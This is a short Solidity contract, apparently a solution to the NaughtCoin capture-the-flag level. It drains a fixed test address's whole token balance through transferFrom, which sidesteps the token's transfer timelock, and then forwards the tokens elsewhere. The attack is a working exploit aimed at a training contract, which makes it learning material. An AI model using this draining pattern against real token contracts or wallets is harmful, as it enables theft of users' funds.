pragma solidity ^0.8.0; import "../levels/NaughtCoin.sol"; contract AttackerFixed { function drain(address _instance) external { uint256 amount = NaughtCoin(_instance).balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266); NaughtCoin(_instance).transferFrom(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, address(this), amount); } function transferTokens(address _instance, address _to) public { NaughtCoin(_instance).transfer(_to, NaughtCoin(_instance).balanceOf(address(this))); } }